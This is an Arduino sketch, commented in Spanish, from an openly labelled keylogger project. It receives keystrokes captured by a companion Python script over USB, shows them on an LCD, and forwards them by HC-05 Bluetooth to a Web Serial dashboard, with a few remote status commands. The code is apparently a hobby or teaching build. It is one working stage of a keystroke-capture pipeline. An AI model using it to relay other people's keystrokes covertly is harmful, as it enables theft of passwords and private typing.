/*
 * ============================================
 * Keylogger Arduino - Compatible con Web Serial API
 * ============================================
 * 
 * Este sketch recibe datos del keylog.py por USB Serial
 * y los reenvía por Bluetooth HC-05 para ser capturados
 * por la página web dashboard usando Web Serial API.
 * 
 * Conexiones:
 * - LCD: RS=12, E=11, D4=5, D5=4, D6=3, D7=2
 * - HC-05: RX=Pin 7 (desde TX del HC-05)
 *          TX=Pin 8 (hacia RX del HC-05)
 * - USB: Recibe datos de keylog.py
 * 
 * Funcionalidad:
 * 1. Recibe teclas capturadas desde Python
 * 2. Muestra en LCD 16x2
 * 3. Reenvía por Bluetooth HC-05
 * 4. Procesa tokens especiales: <EN>, <BK>, etc.
 * 
 * Compatible al 100% con:
 * - keylog.py (entrada)
 * - page/index.html + script.js (salida vía HC-05)
 * ============================================
 */

#include <LiquidCrystal.h>
#include <SoftwareSerial.h>

// ============================================
// CONFIGURACIÓN DE HARDWARE
// ============================================

// LCD 16x2 - Pines según tu diagrama
LiquidCrystal lcd(12, 11, 5, 4, 3, 2);

// Bluetooth HC-05 por SoftwareSerial
// RX del Arduino (pin 7) ← TX del HC-05
// TX del Arduino (pin 8) → RX del HC-05
SoftwareSerial BT(7, 8);

// ============================================
// VARIABLES GLOBALES
// ============================================

// Control de posición en LCD
int col = 0;  // Columna actual (0-15)
int row = 0;  // Fila actual (0-1)

// Estadísticas (mejora sobre el original)
unsigned long caracteresRecibidos = 0;
unsigned long caracteresEnviados = 0;
unsigned long tiempoInicio = 0;

// ============================================
// SETUP - Inicialización
// ============================================

void setup() {
  // Inicializar comunicación Serial USB (desde keylog.py)
  Serial.begin(9600);
  
  // Inicializar comunicación Bluetooth HC-05
  BT.begin(9600);
  
  // Inicializar LCD 16x2
  lcd.begin(16, 2);
  lcd.clear();
  
  // Mensaje de bienvenida
  lcd.setCursor(0, 0);
  lcd.print("Keylog Arduino");
  lcd.setCursor(0, 1);
  lcd.print("Iniciando...");
  
  delay(2000);
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Listo!");
  delay(500);
  lcd.clear();
  
  // Guardar tiempo de inicio
  tiempoInicio = millis();
  
  // Enviar mensaje de inicio por Bluetooth - SIMPLE Y DIRECTO
  BT.print("SISTEMA LISTO\n");
  delay(100);
}

// ============================================
// LOOP PRINCIPAL
// ============================================

void loop() {
  // Datos desde Python
  if (Serial.available()) {
    char c = Serial.read();
    caracteresRecibidos++;

    // Enviar por Bluetooth Y mostrar en LCD
    procesarYEnviar(c);
  }
  
  // Comandos desde Bluetooth (opcional - para control remoto)
  if (BT.available() > 0) {
    String cmd = BT.readStringUntil('\n');
    cmd.trim();
    procesarComando(cmd);
  }
}

// ============================================
// PROCESAMIENTO Y ENVÍO DE DATOS
// ============================================

void procesarYEnviar(char c) {
  // Ignorar saltos de línea
  if (c == '\n' || c == '\r')
    return;

  // Caracter especial: inicio de token <XX>
  if (c == '<') {
    String token = "<";
    
    // ENVIAR el caracter '<' inmediatamente
    BT.write('<');
    caracteresEnviados++;
    
    // Leer el resto del token desde Serial
    unsigned long timeout = millis() + 50; // timeout de 50ms
    while (millis() < timeout) {
      if (Serial.available()) {
        char t = Serial.read();
        token += t;
        
        // Enviar inmediatamente por Bluetooth
        BT.write(t);
        caracteresEnviados++;
        
        if (t == '>') break;
      }
    }

    // Procesar token para el LCD
    procesarTokenLCD(token);
    return;
  }

  // Caracter normal: enviar por Bluetooth Y mostrar en LCD
  BT.write(c);
  caracteresEnviados++;
  
  // Mostrar en LCD
  lcd.setCursor(col, row);
  lcd.print(c);

  col++;
  if (col >= 16) {
    col = 0;
    row++;
    if (row > 1) {
      row = 0;
      lcd.clear();
    }
  }
}

// ============================================
// PROCESAMIENTO DE TOKENS PARA LCD
// ============================================

void procesarTokenLCD(String token) {
  // ENTER
  if (token == "<EN>") {
    row = (row + 1) % 2;
    col = 0;
    lcd.setCursor(col, row);
    return;
  }

  // BACKSPACE
  if (token == "<BK>") {
    if (col > 0) {
      col--;
    } else {
      lcd.setCursor(0, row);
      lcd.print("                ");
      col = 0;
    }
    lcd.setCursor(col, row);
    lcd.print(" ");
    lcd.setCursor(col, row);
    return;
  }

  // FLECHAS - Mostrar indicador temporal
  if (token == "<LEFT>" || token == "<RIGHT>" || token == "<UP>" || token == "<DOWN>") {
    int tempCol = col;
    int tempRow = row;
    
    lcd.setCursor(15, 0);
    if (token == "<LEFT>") lcd.print("<");
    else if (token == "<RIGHT>") lcd.print(">");
    else if (token == "<UP>") lcd.print("^");
    else if (token == "<DOWN>") lcd.print("v");
    
    delay(150);
    lcd.setCursor(15, 0);
    lcd.print(" ");
    lcd.setCursor(tempCol, tempRow);
    return;
  }
  
  // Otros tokens se ignoran en LCD
}

// ============================================
// PROCESAMIENTO DE COMANDOS REMOTOS
// ============================================

void procesarComando(String cmd) {
  cmd.toUpperCase();
  
  // <RST> - Reset del sistema
  if (cmd == "<RST>" || cmd == "/CMD <RST>") {
    lcd.clear();
    col = 0;
    row = 0;
    lcd.setCursor(0, 0);
    lcd.print("Sistema");
    lcd.setCursor(0, 1);
    lcd.print("Reiniciado");
    
    BT.println("✅ Sistema reiniciado");
    BT.flush();
    
    delay(1000);
    lcd.clear();
    return;
  }
  
  // <STATUS> - Mostrar estadísticas
  if (cmd == "<STATUS>" || cmd == "/CMD <STATUS>") {
    unsigned long uptime = (millis() - tiempoInicio) / 1000;
    
    BT.println("=== STATUS DEL SISTEMA ===");
    BT.print("Uptime: ");
    BT.print(uptime);
    BT.println(" segundos");
    BT.print("Caracteres recibidos: ");
    BT.println(caracteresRecibidos);
    BT.print("Caracteres enviados: ");
    BT.println(caracteresEnviados);
    BT.print("Posición LCD: [");
    BT.print(col);
    BT.print(",");
    BT.print(row);
    BT.println("]");
    BT.println("==========================");
    BT.flush();
    
    // Mostrar en LCD brevemente
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("RX:");
    lcd.print(caracteresRecibidos);
    lcd.setCursor(0, 1);
    lcd.print("TX:");
    lcd.print(caracteresEnviados);
    delay(2000);
    lcd.clear();
    lcd.setCursor(col, row);
    return;
  }
  
  // <TEST> - Mensaje de prueba
  if (cmd == "<TEST>" || cmd == "/CMD <TEST>") {
    BT.println("✅ TEST OK - Sistema funcionando correctamente");
    BT.println("Arduino Uno + HC-05 operativo");
    BT.flush();
    
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("Test OK!");
    delay(1000);
    lcd.clear();
    lcd.setCursor(col, row);
    return;
  }
  
  // <INFO> - Información del sistema
  if (cmd == "<INFO>" || cmd == "/CMD <INFO>") {
    BT.println("=== INFORMACIÓN DEL SISTEMA ===");
    BT.println("Hardware: Arduino Uno");
    BT.println("Bluetooth: HC-05");
    BT.println("Display: LCD 16x2");
    BT.println("Baudrate: 9600");
    BT.println("Sketch: KeylogWebSerial.ino");
    BT.println("Compatible: Web Serial API");
    BT.println("===============================");
    BT.flush();
    return;
  }
  
  // <CLEAR> - Limpiar pantalla
  if (cmd == "<CLEAR>" || cmd == "/CMD <CLEAR>") {
    lcd.clear();
    col = 0;
    row = 0;
    BT.println("✅ LCD limpiado");
    BT.flush();
    return;
  }
  
  // Comando desconocido
  BT.print("❌ Comando desconocido: ");
  BT.println(cmd);
  BT.println("Comandos disponibles: <RST>, <STATUS>, <TEST>, <INFO>, <CLEAR>");
  BT.flush();
}

// ============================================
// FUNCIONES AUXILIARES
// ============================================

// Limpiar buffer de LCD (útil para debugging)
void limpiarBufferLCD() {
  lcd.clear();
  col = 0;
  row = 0;
  lcd.setCursor(0, 0);
}

// Enviar mensaje de debug por Bluetooth
void debugBT(String mensaje) {
  #ifdef DEBUG
  BT.print("[DEBUG] ");
  BT.println(mensaje);
  BT.flush();
  #endif
}
